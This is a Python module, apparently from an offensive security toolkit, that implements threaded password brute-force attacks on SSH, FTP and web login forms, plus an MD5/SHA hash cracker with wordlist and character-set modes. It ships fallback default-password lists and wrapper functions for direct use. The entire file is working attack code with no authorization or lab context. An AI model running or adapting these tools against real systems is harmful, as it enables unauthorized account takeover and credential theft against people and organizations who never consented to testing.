"""Brute force and password cracking tools"""

import paramiko
import ftplib
import threading
import requests
import hashlib
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from .utils import ColorPrinter


class SSHBruteForce:
    """SSH brute force tool"""
    
    def __init__(self):
        self.attempts = 0
        self.success = False
        self.credentials = None
    
    def brute_force(self, target, username, wordlist_file, threads=10):
        """Brute force SSH login
        
        Args:
            target: Target IP/hostname
            username: Username to test
            wordlist_file: Path to password wordlist
            threads: Number of concurrent threads
            
        Returns:
            Tuple of (success, credentials) or (False, None)
        """
        self.success = False
        self.credentials = None
        self.attempts = 0
        
        ColorPrinter.info(f"SSH brute force on {target} as {username}")
        ColorPrinter.info(f"Using wordlist: {wordlist_file}")
        
        # Load wordlist
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # Use built-in common passwords if file not found
            passwords = ['password', '123456', 'admin', 'root', 'toor', 'pass', 'guest']
            ColorPrinter.warning("Wordlist not found, using common passwords")
        
        ColorPrinter.info(f"Testing {len(passwords)} passwords")
        
        def test_password(password):
            if self.success:
                return
                
            self.attempts += 1
            if self.attempts % 10 == 0:
                print(f"\rAttempts: {self.attempts}/{len(passwords)}", end='')
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=5)
                ssh.close()
                
                self.success = True
                self.credentials = (username, password)
                ColorPrinter.success(f"SUCCESS: {username}:{password}")
                
            except paramiko.AuthenticationException:
                pass  # Wrong password
            except Exception as e:
                # Other connection errors
                if "Connection refused" in str(e):
                    ColorPrinter.error("SSH service not running")
                    self.success = True  # Stop testing
            finally:
                if not self.success:
                    time.sleep(0.1)  # Rate limiting
        
        # Execute brute force
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(test_password, pwd) for pwd in passwords]
            
            for future in as_completed(futures):
                if self.success:
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    break
        
        print()  # New line after progress
        return self.success, self.credentials


class FTPBruteForce:
    """FTP brute force tool"""
    
    def __init__(self):
        self.attempts = 0
        self.success = False
        self.credentials = None
    
    def brute_force(self, target, username, wordlist_file, threads=10):
        """Brute force FTP login
        
        Args:
            target: Target IP/hostname
            username: Username to test
            wordlist_file: Path to password wordlist
            threads: Number of concurrent threads
            
        Returns:
            Tuple of (success, credentials) or (False, None)
        """
        self.success = False
        self.credentials = None
        self.attempts = 0
        
        ColorPrinter.info(f"FTP brute force on {target} as {username}")
        ColorPrinter.info(f"Using wordlist: {wordlist_file}")
        
        # Load wordlist
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            passwords = ['anonymous', 'password', '123456', 'admin', 'guest']
            ColorPrinter.warning("Wordlist not found, using common passwords")
        
        ColorPrinter.info(f"Testing {len(passwords)} passwords")
        
        def test_password(password):
            if self.success:
                return
                
            self.attempts += 1
            if self.attempts % 10 == 0:
                print(f"\rAttempts: {self.attempts}/{len(passwords)}", end='')
            
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, 21, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                
                self.success = True
                self.credentials = (username, password)
                ColorPrinter.success(f"SUCCESS: {username}:{password}")
                
            except ftplib.error_perm:
                pass  # Wrong credentials
            except Exception as e:
                if "Connection refused" in str(e):
                    ColorPrinter.error("FTP service not running")
                    self.success = True
            finally:
                if not self.success:
                    time.sleep(0.1)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(test_password, pwd) for pwd in passwords]
            
            for future in as_completed(futures):
                if self.success:
                    for f in futures:
                        f.cancel()
                    break
        
        print()
        return self.success, self.credentials


class WebFormBruteForce:
    """Web form authentication brute force"""
    
    def __init__(self):
        self.attempts = 0
        self.success = False
        self.credentials = None
        self.session = requests.Session()
    
    def brute_force(self, url, username_field, password_field, username, 
                   wordlist_file, threads=10, custom_headers=None):
        """Brute force web form authentication
        
        Args:
            url: Login form URL
            username_field: Username field name
            password_field: Password field name
            username: Username to test
            wordlist_file: Path to password wordlist
            threads: Number of concurrent threads
            custom_headers: Custom HTTP headers
            
        Returns:
            Tuple of (success, credentials) or (False, None)
        """
        self.success = False
        self.credentials = None
        self.attempts = 0
        
        ColorPrinter.info(f"Web form brute force on {url}")
        ColorPrinter.info(f"Fields: {username_field}, {password_field}")
        ColorPrinter.info(f"Username: {username}")
        
        # Load wordlist
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            passwords = ['password', '123456', 'admin', 'login', 'welcome']
            ColorPrinter.warning("Wordlist not found, using common passwords")
        
        ColorPrinter.info(f"Testing {len(passwords)} passwords")
        
        # Detect success indicators
        success_indicators = [
            'dashboard',
            'welcome',
            'logout',
            'profile',
            'home',
            'success'
        ]
        
        failure_indicators = [
            'invalid',
            'incorrect',
            'failed',
            'error',
            'denied'
        ]
        
        def test_password(password):
            if self.success:
                return
                
            self.attempts += 1
            if self.attempts % 5 == 0:
                print(f"\rAttempts: {self.attempts}/{len(passwords)}", end='')
            
            try:
                # Prepare form data
                form_data = {
                    username_field: username,
                    password_field: password
                }
                
                response = self.session.post(url, data=form_data, 
                                           headers=custom_headers, 
                                           timeout=10, allow_redirects=True)
                
                # Check response for success/failure
                content = response.text.lower()
                
                # Check for failure indicators
                if any(indicator in content for indicator in failure_indicators):
                    return  # Failed login
                
                # Check for success indicators or redirect
                if (response.status_code == 200 and 
                    any(indicator in content for indicator in success_indicators)) or \
                   response.status_code in [301, 302]:
                   
                    self.success = True
                    self.credentials = (username, password)
                    ColorPrinter.success(f"SUCCESS: {username}:{password}")
                    
            except Exception as e:
                ColorPrinter.warning(f"Request error: {str(e)[:50]}")
            finally:
                if not self.success:
                    time.sleep(0.2)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(test_password, pwd) for pwd in passwords]
            
            for future in as_completed(futures):
                if self.success:
                    for f in futures:
                        f.cancel()
                    break
        
        print()
        return self.success, self.credentials


class HashCracker:
    """Password hash cracker"""
    
    def __init__(self):
        self.found = False
        self.password = None
    
    def crack_hash(self, hash_value, hash_type='md5', wordlist_file=None, 
                   brute_force=False, charset='abcdefghijklmnopqrstuvwxyz', max_length=6):
        """Crack password hash
        
        Args:
            hash_value: Hash to crack
            hash_type: Hash algorithm (md5, sha1, sha256, sha512)
            wordlist_file: Path to wordlist file
            brute_force: Whether to use brute force
            charset: Character set for brute force
            max_length: Maximum password length for brute force
            
        Returns:
            Tuple of (found, password) or (False, None)
        """
        self.found = False
        self.password = None
        hash_value = hash_value.lower()
        
        ColorPrinter.info(f"Cracking {hash_type} hash: {hash_value}")
        
        # Wordlist attack
        if wordlist_file and not brute_force:
            try:
                with open(wordlist_file, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                passwords = ['password', '123456', 'admin', 'letmein', 'qwerty']
                ColorPrinter.warning("Wordlist not found, using common passwords")
            
            ColorPrinter.info(f"Testing {len(passwords)} passwords from wordlist")
            
            for i, password in enumerate(passwords):
                if i % 1000 == 0:
                    print(f"\rProgress: {i}/{len(passwords)}", end='')
                
                test_hash = self._hash_password(password, hash_type)
                if test_hash == hash_value:
                    self.found = True
                    self.password = password
                    ColorPrinter.success(f"FOUND: {password}")
                    break
            
            print()
            if self.found:
                return self.found, self.password
        
        # Brute force attack
        if brute_force:
            ColorPrinter.info(f"Starting brute force with charset: {charset}")
            ColorPrinter.info(f"Max length: {max_length}")
            
            self._brute_force_recursive(hash_value, hash_type, '', charset, max_length, 0)
        
        return self.found, self.password
    
    def _hash_password(self, password, hash_type):
        """Generate hash for password"""
        try:
            if hash_type == 'md5':
                return hashlib.md5(password.encode()).hexdigest()
            elif hash_type == 'sha1':
                return hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == 'sha256':
                return hashlib.sha256(password.encode()).hexdigest()
            elif hash_type == 'sha512':
                return hashlib.sha512(password.encode()).hexdigest()
            else:
                raise ValueError(f"Unsupported hash type: {hash_type}")
        except Exception:
            return ""
    
    def _brute_force_recursive(self, target_hash, hash_type, current, charset, max_length, position):
        """Recursive brute force implementation"""
        if self.found or position >= max_length:
            return
            
        for char in charset:
            new_password = current + char
            
            if position % 1000 == 0:
                print(f"\rTesting: {new_password:<20}", end='')
            
            test_hash = self._hash_password(new_password, hash_type)
            if test_hash == target_hash:
                self.found = True
                self.password = new_password
                ColorPrinter.success(f"FOUND: {new_password}")
                return
            
            # Recursive call for next position
            self._brute_force_recursive(target_hash, hash_type, new_password, 
                                      charset, max_length, position + 1)
            
            if self.found:
                return


# Convenience functions
def ssh_bruteforce(target, username, wordlist_file, threads=10):
    """Convenience function for SSH brute force"""
    brute = SSHBruteForce()
    return brute.brute_force(target, username, wordlist_file, threads)

def ftp_bruteforce(target, username, wordlist_file, threads=10):
    """Convenience function for FTP brute force"""
    brute = FTPBruteForce()
    return brute.brute_force(target, username, wordlist_file, threads)

def webform_bruteforce(url, username_field, password_field, username, 
                      wordlist_file, threads=10, headers=None):
    """Convenience function for web form brute force"""
    brute = WebFormBruteForce()
    return brute.brute_force(url, username_field, password_field, username, 
                           wordlist_file, threads, headers)

def crack_password_hash(hash_value, hash_type='md5', wordlist_file=None, 
                       brute_force=False, charset='abcdefghijklmnopqrstuvwxyz', max_length=6):
    """Convenience function for hash cracking"""
    cracker = HashCracker()
    return cracker.crack_hash(hash_value, hash_type, wordlist_file, brute_force, charset, max_length)